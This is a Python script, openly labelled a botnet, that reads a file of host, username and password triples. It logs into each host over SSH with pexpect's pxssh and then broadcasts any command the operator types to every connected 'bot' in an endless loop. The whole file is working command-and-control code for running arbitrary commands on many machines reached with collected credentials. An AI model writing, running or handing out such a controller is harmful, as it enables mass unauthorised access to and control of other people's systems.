import pexpect
from pexpect import pxssh
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-c","--clients",type=str,help="File with users and passwords for botnet. host:user:pass")
args = parser.parse_args()

bots = []

class Client:
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.ssh_session = self.connect()

    def connected(self):
        if(self.ssh_session == None):
            return False
        else:
            return True

    def connect(self):
            try:
                ssh_session = pxssh.pxssh()
                ssh_session.login(server=self.host,username=self.user,password=self.password)
                return ssh_session
            except pxssh.ExceptionPxssh as err:
                print(self.user + ":" + self.password + " on: " + self.host + "failed to connect.")
                print(err)
                return None

    def send_command(self,cmd):
        self.ssh_session.sendline(cmd)
        if(self.ssh_session.prompt()):
            print("\n" + self.user+ "@" + self.host + ":")
            print(self.ssh_session.before.decode("unicode_escape"))
        else:
            print("TIMEOUT on " + self.host)
        print("\n")

def addClient(host,user,password):
    c = Client(host,user,password)
    if(c.connected()):
        bots.append(c)
        c.send_command("uname -v")

def botNetCommand(cmd):
    for bot in bots:
        bot.send_command(cmd)

try:
    clientsFile = open(args.clients.strip())
    clients = clientsFile.readlines()
    for c in clients:
        host = c.split(":")[0]
        user = c.split(":")[1]
        pwd = c.split(":")[2]
        addClient(host,user,pwd)
except OSError as err:
    print(err)
    exit(1)

while(True):
    print("\nEnter botnet command:")
    cmd = input()
    botNetCommand(cmd)




